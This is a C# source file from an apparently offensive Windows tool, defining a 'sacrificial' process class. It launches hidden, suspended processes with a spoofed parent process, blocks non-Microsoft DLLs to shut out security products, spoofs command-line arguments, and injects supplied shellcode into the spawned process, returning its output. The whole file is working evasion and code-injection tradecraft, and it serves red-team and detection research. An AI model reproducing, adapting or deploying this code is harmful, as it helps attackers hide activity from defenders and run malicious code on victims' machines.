using DemoApp.Deception;
using DemoApp.Injection;

using Microsoft.Win32.SafeHandles;

using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace DemoApp.Sacrificial
{
    public class Lamb
    {
        readonly int PPID;
        readonly bool BlockDLLs;

        string Command;
        string FakeArgs;
        string RealArgs;

        public Lamb(int PPID, bool BlockDLLs = true)
        {
            this.PPID = PPID;
            this.BlockDLLs = BlockDLLs;
        }

        #region Constants
        // STARTUPINFOEX members
        const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
        const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;

        // Block non-Microsoft signed DLL's
        const long PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;

        // STARTUPINFO members (dwFlags and wShowWindow)
        const int STARTF_USESTDHANDLES = 0x00000100;
        const int STARTF_USESHOWWINDOW = 0x00000001;
        const short SW_HIDE = 0x0000;

        // dwCreationFlags
        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        const uint CREATE_NO_WINDOW = 0x08000000;
        const uint CREATE_SUSPENDED = 0x00000004;
        #endregion

        public string Run(string Command, string FakeArgs, string RealArgs)
        {
            this.Command = Command;
            this.FakeArgs = Command + " " + FakeArgs;
            this.RealArgs = Command + " " + RealArgs;

            var pi = Sacrifice(out IntPtr readPipe);

            var mole = new Mole(pi, this.RealArgs);
            mole.SpoofArgs();

            return ReadFromPipe(pi, readPipe);
        }

        public string Shell(string FakeArgs, string RealArgs)
        {
            this.Command = @"C:\Windows\System32\cmd.exe";
            this.FakeArgs = FakeArgs;
            this.RealArgs = RealArgs;

            var pi = Sacrifice(out IntPtr readPipe);

            var mole = new Mole(pi, this.RealArgs);
            mole.SpoofArgs();

            return ReadFromPipe(pi, readPipe);
        }

        public string Inject(string SpawnTo, string FakeArgs, byte[] Shellcode)
        {
            this.Command = SpawnTo;
            this.FakeArgs = FakeArgs;
            var pi = Sacrifice(out IntPtr readPipe);

            var mole = new Mole(pi, this.RealArgs);
            mole.SpoofArgs();

            var needle = new Needle(pi);
            needle.Inject(Shellcode);

            return ReadFromPipe(pi, readPipe);
        }

        private PROCESS_INFORMATION Sacrifice(out IntPtr readPipe, bool CreateSuspended = false)
        {
            // Setup handles
            var hSa = new SECURITY_ATTRIBUTES();
            hSa.nLength = Marshal.SizeOf(hSa);
            hSa.bInheritHandle = true;

            var hDupStdOutWrite = IntPtr.Zero;

            // Create pipe
            CreatePipe(
                out IntPtr hStdOutRead,
                out IntPtr hStdOutWrite,
                ref hSa,
                0
                );

            SetHandleInformation(
                hStdOutRead,
                HandleFlags.Inherit,
                0
                );

            // Initialise Startup Info
            var siEx = new STARTUPINFOEX();
            siEx.StartupInfo.cb = Marshal.SizeOf(siEx);
            siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
            siEx.StartupInfo.wShowWindow = SW_HIDE;

            var lpValueProc = IntPtr.Zero;

            try
            {
                var lpSize = IntPtr.Zero;

                var dwAttributeCount = BlockDLLs ? 2 : 1;

                InitializeProcThreadAttributeList(
                    IntPtr.Zero,
                    dwAttributeCount,
                    0,
                    ref lpSize
                    );

                siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);

                InitializeProcThreadAttributeList(
                    siEx.lpAttributeList,
                    dwAttributeCount,
                    0,
                    ref lpSize
                    );

                // BlockDLLs
                if (BlockDLLs)
                {
                    var lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);

                    Marshal.WriteInt64(
                        lpMitigationPolicy,
                        PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
                        );

                    UpdateProcThreadAttribute(
                        siEx.lpAttributeList,
                        0,
                        (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                        lpMitigationPolicy,
                        (IntPtr)IntPtr.Size,
                        IntPtr.Zero,
                        IntPtr.Zero
                        );
                }

                var hParent = Process.GetProcessById(PPID).Handle;

                // PPID spoof
                lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);

                Marshal.WriteIntPtr(
                    lpValueProc,
                    hParent
                    );

                UpdateProcThreadAttribute(
                    siEx.lpAttributeList,
                    0,
                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpValueProc,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero
                    );

                // Duplicate handles
                var hCurrent = Process.GetCurrentProcess().Handle;

                DuplicateHandle(
                    hCurrent,
                    hStdOutWrite,
                    hParent,
                    ref hDupStdOutWrite,
                    0,
                    true,
                    DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess
                    );

                siEx.StartupInfo.hStdError = hDupStdOutWrite;
                siEx.StartupInfo.hStdOutput = hDupStdOutWrite;

                // Start Process
                var ps = new SECURITY_ATTRIBUTES();
                var ts = new SECURITY_ATTRIBUTES();
                ps.nLength = Marshal.SizeOf(ps);
                ts.nLength = Marshal.SizeOf(ts);

                CreateProcess(
                    Command,
                    FakeArgs,
                    ref ps,
                    ref ts,
                    true,
                    EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW | CREATE_SUSPENDED,
                    IntPtr.Zero,
                    null,
                    ref siEx,
                    out PROCESS_INFORMATION pInfo
                    );

                readPipe = hStdOutRead;
                return pInfo;
            }
            finally
            {
                // Free attribute list
                DeleteProcThreadAttributeList(siEx.lpAttributeList);
                Marshal.FreeHGlobal(siEx.lpAttributeList);
                Marshal.FreeHGlobal(lpValueProc);
            }
        }

        private string ReadFromPipe(PROCESS_INFORMATION pi, IntPtr readPipe)
        {
            var hSafe = new SafeFileHandle(readPipe, false);
            var fileStream = new FileStream(hSafe, FileAccess.Read);

            var result = new StringBuilder();

            using (var reader = new StreamReader(fileStream))
            {
                bool exit = false;

                try
                {
                    do
                    {
                        // Has process has signaled to exit?
                        if (WaitForSingleObject(pi.hProcess, 100) == 0)
                        {
                            exit = true;
                        }

                        // Get number of bytes in the pipe waiting to be read
                        uint bytesToRead = 0;
                        PeekNamedPipe(readPipe, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero);

                        // If there are no bytes and process has closed, let's bail
                        // If this evaluates to false, we automatically loop again
                        if (bytesToRead == 0 && exit)
                        {
                            break;
                        }

                        // Otherwise, read from the pipe
                        var buf = new char[bytesToRead];
                        reader.Read(buf, 0, buf.Length);
                        result.Append(new string(buf));

                    } while (true);
                }
                finally
                {
                    hSafe.Close();
                }
            }

            // Close remaining handles
            CloseHandle(readPipe);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);

            // Return result
            return result.ToString();
        }

        [DllImport("kernel32.dll")]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFOEX lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
            );

        [DllImport("kernel32.dll")]
        static extern int WaitForSingleObject(
            IntPtr handle,
            int milliseconds
            );

        [DllImport("kernel32.dll")]
        static extern bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList,
            uint dwFlags,
            IntPtr Attribute,
            IntPtr lpValue,
            IntPtr cbSize,
            IntPtr lpPreviousValue,
            IntPtr lpReturnSize
            );

        [DllImport("kernel32.dll")]
        static extern bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList,
            int dwAttributeCount,
            int dwFlags,
            ref IntPtr lpSize
            );

        [DllImport("kernel32.dll")]
        static extern bool DeleteProcThreadAttributeList(
            IntPtr lpAttributeList
            );

        [DllImport("kernel32.dll")]
        static extern bool SetHandleInformation(
            IntPtr hObject,
            HandleFlags dwMask,
            HandleFlags dwFlags
            );

        [DllImport("kernel32.dll")]
        static extern bool PeekNamedPipe(
            IntPtr handle,
            IntPtr buffer,
            IntPtr nBufferSize,
            IntPtr bytesRead,
            ref uint bytesAvail,
            IntPtr BytesLeftThisMessage
            );

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(
            IntPtr hObject
            );

        [DllImport("kernel32.dll")]
        static extern bool DuplicateHandle(
            IntPtr hSourceProcessHandle,
            IntPtr hSourceHandle,
            IntPtr hTargetProcessHandle,
            ref IntPtr lpTargetHandle,
            uint dwDesiredAccess,
            bool bInheritHandle,
            DuplicateOptions dwOptions
            );

        [DllImport("kernel32.dll")]
        static extern bool CreatePipe(
            out IntPtr hReadPipe,
            out IntPtr hWritePipe,
            ref SECURITY_ATTRIBUTES lpPipeAttributes,
            uint nSize
            );

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        [Flags]
        enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [Flags]
        enum HandleFlags : uint
        {
            None = 0,
            Inherit = 1,
            ProtectFromClose = 2
        }

        [Flags]
        enum DuplicateOptions : uint
        {
            DuplicateCloseSource = 0x00000001,
            DuplicateSameAccess = 0x00000002
        }
    }
}